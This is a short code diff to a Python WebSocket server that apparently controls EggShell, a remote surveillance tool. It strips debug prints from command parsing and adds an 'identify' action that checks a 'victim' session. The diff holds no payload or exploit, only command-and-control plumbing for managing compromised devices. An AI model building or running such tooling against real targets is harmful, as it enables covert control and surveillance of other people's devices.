@@ -124,18 +124,12 @@ class WsServer:
                     raw_cmd = json.loads(client_data.decode())
                     command = raw_cmd['command']
                     if 'victims_type' in raw_cmd:
-                        print (1)
                         victims_type = raw_cmd['victims_type']
-                        print (2)
                     else:
-                        print (3)
                         victims_type = None
                     if 'content' in raw_cmd:
-                        print (4)
                         content = raw_cmd['content']
-                        print (5)
                     else:
-                        print (6)
                         content = None
                 except:
                     self.error_res(conn, "Invalid Request")
@@ -237,6 +231,12 @@ class WsServer:
                 self.send_data(conn, json.dumps(response))
             else:
                 self.error_res(conn, "Error in Execution")
+        elif action == 'identify':
+            identified = self.eggshell.server.multihandler.identify_victim(session_id)
+            response["status"] = "Success"
+            response["content_type"] = "boolean"
+            response["content"] = identified
+            self.send_data(conn, json.dumps(response))
         else:
             self.error_res(conn, "Invalid Action")
         return
